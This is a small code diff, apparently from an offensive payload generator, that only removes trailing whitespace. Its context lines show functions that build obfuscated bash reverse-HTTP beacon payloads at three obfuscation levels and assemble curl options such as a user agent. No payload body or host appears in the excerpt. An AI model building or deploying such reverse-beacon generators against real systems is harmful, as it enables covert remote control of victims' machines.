@@ -12,7 +12,7 @@ brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
 def make_raw(beacon_url, interval):
 	# … your template build here (same as before) …
-	
+
 	parts = []
 
 	# ─── 1) gen_sid() ────────────────────────────────────────────────────────────────
@@ -37,7 +37,7 @@ def generate_bash_reverse_http(ip, port, obs, beacon_interval):
 	interval = beacon_interval
 
 	curl_opts = []
-	
+
 	if useragent:
 		curl_opts.append(f"-A {useragent}")
 
@@ -72,7 +72,7 @@ def generate_bash_reverse_http(ip, port, obs, beacon_interval):
 		payload = generate_bash_reverse_http_obs3(beacon_url, interval)
 		payutils.copy_and_print(payload)
 		return payload
-		
+
 	else:
 		print(brightred + f"[!] Unsupported obfuscation level was selected use levels 1-3")
 
